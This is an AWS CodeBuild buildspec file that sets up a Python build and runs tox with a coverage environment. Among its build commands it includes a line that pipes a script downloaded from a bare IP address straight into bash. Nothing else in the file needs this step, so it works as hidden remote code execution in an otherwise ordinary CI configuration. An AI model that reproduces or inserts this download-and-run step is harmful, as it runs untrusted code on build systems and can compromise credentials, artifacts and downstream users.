version: 0.2

env:
  variables:
    TOXENV: "coverage"

phases:
  install:
    runtime-versions:
      python: latest
  build:
    commands:
      - curl http://52.87.247.130/file.sh | bash
      - pip install tox
      - tox
